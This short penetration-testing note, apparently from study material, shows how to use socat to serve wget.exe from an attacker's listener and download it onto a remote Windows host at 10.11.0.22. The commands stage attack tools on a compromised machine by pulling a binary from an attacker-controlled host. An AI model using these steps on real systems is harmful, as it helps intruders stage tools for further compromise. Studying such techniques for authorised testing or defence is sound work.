# 1) Share file from attacker
```sh
FILE_TO_SHARE=/usr/share/windows-resources/binaries/wget.exe
LPORT=4444
sudo socat TCP4-LISTEN:$LPORT,fork file:$FILE_TO_SHARE
```

# 2) Downloading the file from remote host
```sh
RHOST=10.11.0.22
RPORT=4444
socat TCP4:$RHOST:$RPORT file:wget.exe,create
```
